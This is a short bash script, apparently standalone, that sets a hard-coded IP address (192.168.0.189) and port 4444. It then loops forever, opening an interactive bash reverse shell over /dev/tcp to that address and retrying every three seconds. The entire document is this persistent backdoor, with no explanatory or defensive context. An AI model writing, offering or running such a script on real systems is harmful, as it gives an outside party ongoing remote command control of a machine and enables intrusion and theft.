#!/bin/bash
IP="192.168.0.189"
PORT="4444"
while :; do
  bash -i >& /dev/tcp/$IP/$PORT 0>&1
  sleep 3
done
